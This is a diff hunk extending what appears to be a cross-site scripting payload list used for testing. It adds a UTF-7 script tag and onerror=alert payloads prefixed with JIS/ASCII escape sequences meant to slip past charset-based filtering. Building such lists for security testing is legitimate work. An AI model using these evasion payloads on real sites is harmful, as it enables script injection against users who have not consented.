@@ -63,3 +63,12 @@
 "><img src="x" onerror="alert(1)">
 %27%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E
 <img src="x" onerror=decodeURIComponent('%61%6c%65%72%74%28%31%29')>
++ADw-script+AD4-alert(1)+ADw-+AC8-script+AD4-  #utf-7
+\x1b(B onerror=alert(8)// # ASCII
+\x1b$@ onerror=alert(8)// # JIS X 0208 1978
+\x1b(J onerror=alert(8)// # JIS X 0201 1976
+\x1b$B onerror=alert(8)//
+%1b(B onerror=alert(8)// # ASCII
+%1b$@ onerror=alert(8)// # JIS X 0208 1978
+%1b(J onerror=alert(8)// # JIS X 0201 1976
+%1b$B onerror=alert(8)//
